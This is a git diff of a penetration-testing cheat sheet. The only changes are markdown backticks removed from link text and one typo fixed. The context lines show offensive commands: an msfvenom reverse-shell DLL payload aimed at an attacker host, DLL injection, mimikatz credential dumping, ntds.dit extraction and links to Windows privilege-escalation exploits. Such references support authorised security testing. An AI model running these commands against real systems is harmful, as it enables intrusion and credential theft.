@@ -187,7 +187,7 @@ dnsrecon -t axfr <ip>
 dig axfr <domain> @<nsip>
 ```
 
-* RPC enumeration; check out [SANS practical usage of `rpcclient`](https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions)
+* RPC enumeration; check out [SANS practical usage of rpcclient](https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions)
 ``` sh
 # display list of RPC programs
 rpcinfo -p <ip>
@@ -961,7 +961,7 @@ cat /etc/sudoers
 sudo -l
 ```
 
-* Running processes (look for things like [`udev`](https://www.exploit-db.com/exploits/8572/))
+* Running processes (look for things like [udev](https://www.exploit-db.com/exploits/8572/))
 ``` sh
 ps aux
 ```
@@ -1026,7 +1026,7 @@ ls -ahlR /root/
 ls -ahlR /home/
 ```
 
-* Scheduled jobs (look for things like [`chkrootkit`](https://www.exploit-db.com/exploits/33899/))
+* Scheduled jobs (look for things like [chkrootkit](https://www.exploit-db.com/exploits/33899/))
 ``` sh
 crontab -l
 ls -alh /var/spool/cron
@@ -1841,7 +1841,7 @@ dir C:\Users\<user>\AppData\Local\Microsoft\Credentials\
 dir C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
 ```
 
-* DLL injection (use [`RemoteDLLInjector.exe`](https://securityxploded.com/remote-dll-injector.php) for Windows XP to 8; alternatives include [Metasploit](https://www.rapid7.com/db/modules/post/windows/manage/reflective_dll_inject) and [PowerSploit](https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-DllInjection/))
+* DLL injection (use [RemoteDLLInjector.exe](https://securityxploded.com/remote-dll-injector.php) for Windows XP to 8; alternatives include [Metasploit](https://www.rapid7.com/db/modules/post/windows/manage/reflective_dll_inject) and [PowerSploit](https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-DllInjection/))
 ``` bat
 :: on attack machine, make your dll payload
 msfvenom -p windows/shell_reverse_tcp LHOST=<attackip> LPORT=<attackport> -f dll > ./payload.dll
@@ -1853,7 +1853,7 @@ RemoteDLLInjector64.exe <pid> <dllpath>
 
 * DLL hijacking
   * Check for processes with missing DLLs with [process monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
-  * Alternatively, use PowerSploit's [`Find-ProcessDLLHijack`](https://powersploit.readthedocs.io/en/latest/Privesc/Find-ProcessDLLHijack/)
+  * Alternatively, use PowerSploit's [Find-ProcessDLLHijack](https://powersploit.readthedocs.io/en/latest/Privesc/Find-ProcessDLLHijack/)
   * Check for write permissions on a folder via `icacls <path>`
 
 * Secondary logon handle (works on lots of Windows version but requires 2 CPUs and PowerShell 2.0); use [this PowerShell script](https://www.exploit-db.com/exploits/39719/) or [binary exploit](https://github.com/khr0x40sh/ms16-032)
@@ -1871,7 +1871,7 @@ Invoke-MS16-032
 .\ms16-032.exe
 ```
 
-* [`sysret`](https://github.com/shjalayeri/sysret) exploit
+* [sysret](https://github.com/shjalayeri/sysret) exploit
 ``` bat
 :: find a running system-level process and grab its PID
 tasklist
@@ -1925,7 +1925,7 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn
 |                                                                                                          | Windows Vista/2008 6.1.6001 x86 |
 |                                                                                                          | Windows 7 6.2.7600 x86 |
 |                                                                                                          | Windows 7/2008 R2 6.2.7600 x64 |
-| [`afd.sys` MS11-046](https://www.exploit-db.com/exploits/40564/)                                         | Windows XP SP3 x86 |
+| [afd.sys MS11-046](https://www.exploit-db.com/exploits/40564/)                                         | Windows XP SP3 x86 |
 |                                                                                                          | Windows XP Pro SP2 x64 |
 |                                                                                                          | Windows Server 2003 SP2 x86/x64 |
 |                                                                                                          | Windows Vista SP1/SP2 x86/x64 |
@@ -1979,7 +1979,7 @@ ntdsutil
 esentutl /p /o ntds.dit
 ```
 
-* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) (get packaged binaries [here](https://github.com/gentilkiwi/mimikatz/releases))
+* [mimikatz](https://github.com/gentilkiwi/mimikatz) (get packaged binaries [here](https://github.com/gentilkiwi/mimikatz/releases))
 ``` bat
 :: ensure you have appropriate privileges
 mimikatz # privilege::debug
@@ -2769,9 +2769,9 @@ Get-Printer -ComputerName <computername> | where PrinterStatus -eq Error | fl Na
   * [NCC Group - Win32 exploits from scratch](https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/)
   * [Do Stack Buffer Overflow Good](https://github.com/justinsteven/dostackbufferoverflowgood)
   * [Corelan - Stack Based Overflows](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
-  * [Bulb Security - Finding Bad Characters with `monay.py`](https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/)
+  * [Bulb Security - Finding Bad Characters with mona.py](https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/)
   * [IppSec example of bypassing DEP and ASLR](https://youtu.be/K05mJazHhF4)
-  * [`mona.py`](https://github.com/corelan/mona)
+  * [mona.py](https://github.com/corelan/mona)
 
 * Cross-platform endianness check; note that this will be little for x86 systems
 ```sh
@@ -3151,8 +3151,8 @@ tmux attach -t <target>
 * [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 * [MySQL cheat sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
 * [Esaping Restricted Linux Shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)
-* [`tcpdump` reference](https://danielmiessler.com/study/tcpdump/)
-* [`tmux` shortcuts](https://gist.github.com/MohamedAlaa/2961058)
+* [tcpdump reference](https://danielmiessler.com/study/tcpdump/)
+* [tmux shortcuts](https://gist.github.com/MohamedAlaa/2961058)
 * [PWK/OSCP checklist](https://gist.github.com/unfo/5ddc85671dcf39f877aaf5dce105fac3)
 * [Dumping Windows Credentials](https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/)
 * [Transferring files from Kali to Windows](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
